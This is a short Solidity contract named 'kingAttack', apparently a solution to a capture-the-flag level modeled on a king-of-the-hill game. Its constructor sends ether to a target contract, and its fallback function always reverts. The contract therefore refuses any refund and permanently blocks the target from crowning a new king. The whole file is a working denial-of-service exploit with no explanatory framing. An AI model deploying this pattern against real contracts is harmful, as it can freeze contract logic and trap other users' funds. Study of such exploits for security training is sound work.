pragma solidity 0.8.9;

contract kingAttack {
    constructor(address _target) public payable {
        address(_target).call{value: msg.value}("");
    }

    fallback() external payable {
        revert("");
    }
}
